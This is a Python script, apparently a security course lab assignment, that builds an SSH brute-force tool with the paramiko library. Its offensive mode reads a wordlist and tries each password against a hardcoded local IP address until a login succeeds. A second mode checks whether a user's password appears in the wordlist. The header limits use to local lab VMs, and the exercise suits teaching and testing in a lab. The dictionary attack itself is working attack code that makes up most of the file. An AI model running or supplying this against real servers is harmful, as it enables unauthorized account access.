#!/usr/bin/python3
import sys
import paramiko
import time
from getpass import getpass

# Script Name:                  Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Author:                       NATASHA SIRAMARCO
# Date of latest revision:      08/02/2023
# Purpose                       Requirements
#                               Add to your Python brute force tool the capability to:
#                               
#                               Authenticate to an SSH server by its IP address.
#                               Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
#                               
#     Important                Note: Stay out of trouble! Restrict this kind of traffic to your local network VMs.

# Functions
# First Mode: iterates through wordlist
def iterator():
    # user input complete filepath
    filepath = input("Enter filepath for wordlist: ")
    # Open wordlist
    file = open(filepath, 'r')

    # Read file first line on wordlist/ variable called line
    line = file.readline()

    # while loop for each line in wordlist
    while line:
        # not reading empty trailing space
        line = line.rstrip()
        # line variable into word
        word = line
        print(f"Password: {word}")

        # SSH authentication
        try:
            # username and IP address of SSH server
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect('192.168.0.101', username='username', password=word)

            # Authentication succeeded
            print(f"Login Successful! Password: {word}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            # If authentication fails, try next password in wordlist
            pass

        time.sleep(1)

        # Next line in wordlist
        line = file.readline()

    file.close()

# Second Mode: Defensive; Password Recognized
def password_recognized():
    # User Password
    user_password = getpass("Enter password:")
    # User input word list file path
    filepath = input("Enter filepath for wordlist: ")

    # Open wordlist
    with open(filepath, 'r') as file:
        # Read all lines & remove trailing spaces
        word_list = [line.strip() for line in file]

    # Check ifinput string is in the wordlist
    if user_password in word_list:
        print("The password appeared in the wordlist.")
    else:
        print("The password did not appear in the wordlist.")

# Main
# Mode menu
mode = input("""Select a mode: 
             1: Offensive; Dictionary Iterator. 
             2: Defensive; Password Recognized.
             3: Exit 
             """)

# Run the corresponding mode
if mode == '1':
    iterator()
elif mode == '2':
    password_recognized()
elif mode == '3':
    sys.exit()
else:
    print("Invalid mode selection, Please choose 1, 2 or 3.")



# END

#           Resources
#           [How to Make an SSH Brute-Forcer in Python](https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/)
#           [How to Execute Shell Commands in a Remote Machine using Python - Paramiko](https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/)